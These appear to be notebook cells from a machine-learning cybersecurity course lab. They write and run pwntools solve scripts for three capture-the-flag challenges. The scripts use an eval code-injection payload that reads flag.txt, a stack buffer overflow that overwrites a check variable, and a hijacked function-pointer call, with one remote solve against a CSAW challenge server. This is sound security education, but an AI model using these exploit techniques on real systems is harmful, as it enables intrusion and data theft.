```python
import os

# 1. Define the code for the manual solution
manual_code = r"""#!/usr/bin/env python3
from pwn import *

def solve():
    # 1. Start the target process
    # We look for my_first_pwnie.py in the current folder
    try:
        p = process(['python3', 'my_first_pwnie.py'])
    except Exception as e:
        print(f"[-] Error: {e}")
        return

    # 2. Wait for the prompt "What's the password?"
    p.recvuntil(b"password? ")

    # 3. Send the payload
    # eval(input()) executes this string as Python code
    payload = "__import__('os').popen('cat flag.txt').read()"
    p.sendline(payload.encode())

    # 4. Print the output (the flag)
    output = p.recvall().decode()
    print("\n=== FLAG OUTPUT ===")
    print(output)
    print("===================")

if __name__ == "__main__":
    solve()
"""

# 2. Define the folder path
folder_path = "/content/ML-CyberSec-2025-Lab2-Public/my_first_pwnie"

# 3. Create the file directly
file_path = os.path.join(folder_path, "first_solve.py")

print(f"[*] Writing script to: {file_path}")
with open(file_path, "w") as f:
    f.write(manual_code)

print("[+] Success! File created.")
print("[*] Running the script now...\n")

# 4. Run it immediately to test
os.chdir(folder_path)
os.system("python3 first_solve.py")
```

```python
import os

# 1. Define the code for the manual solution
manual_code = r"""#!/usr/bin/env python3
from pwn import *

def build_payload():
    # Buffer is 0x30 bytes; a 4-byte flag at [rbp-0x4] is checked.
    # We overwrite that int with a non-zero value to trigger system("cat /flag.txt").
    padding = b"A" * 44      # 0x30 - 0x4
    flag_val = p32(1)        # little-endian non-zero
    return padding + flag_val

def solve_local():
    p = process(["./puffin"])
    p.recvuntil(b"The penguins are watching: ")
    p.sendline(build_payload())
    print(p.recvall(timeout=2).decode())
    p.close()

if __name__ == "__main__":
    solve_local()
"""

# 2. Define the folder path
folder_path = "/content/ML-CyberSec-2025-Lab2-Public/puffin"

# 3. Create the file directly
file_path = os.path.join(folder_path, "manual_solve_puffin.py")

print(f"[*] Writing script to: {file_path}")
with open(file_path, "w") as f:
    f.write(manual_code)

print("[+] Success! File created.")
print("[*] Running the script now...\n")
```

```python
import os

manual_code = r"""#!/usr/bin/env python3
from pwn import *

# Vulnerability: main does scanf("%lx") into a function pointer, then calls it (call *%rax).
# No PIE, so cat_flag is at a fixed address: 0x400717. We just feed that address.

CAT_FLAG = 0x400717

def solve_local():
    p = process(["./target_practice"])
    p.recvuntil(b"carefully")
    p.sendline(f"{CAT_FLAG:x}".encode())  # send hex string
    print(p.recvall(timeout=2).decode())
    p.close()

def solve_remote():
    host, port = "pwn.chal.csaw.io", 31138  # from challenge.json
    p = remote(host, port)
    p.recvuntil(b"carefully")
    p.sendline(f"{CAT_FLAG:x}".encode())
    print(p.recvall(timeout=2).decode())
    p.close()

if __name__ == "__main__":
    solve_local()  # switch to solve_remote() for the server
"""

folder_path = "/content/ML-CyberSec-2025-Lab2-Public/target_practice"
file_path = os.path.join(folder_path, "manual_solve_target_practice.py")

print(f"[*] Writing script to: {file_path}")
with open(file_path, "w") as f:
    f.write(manual_code)

print("[+] Success! File created.")
```
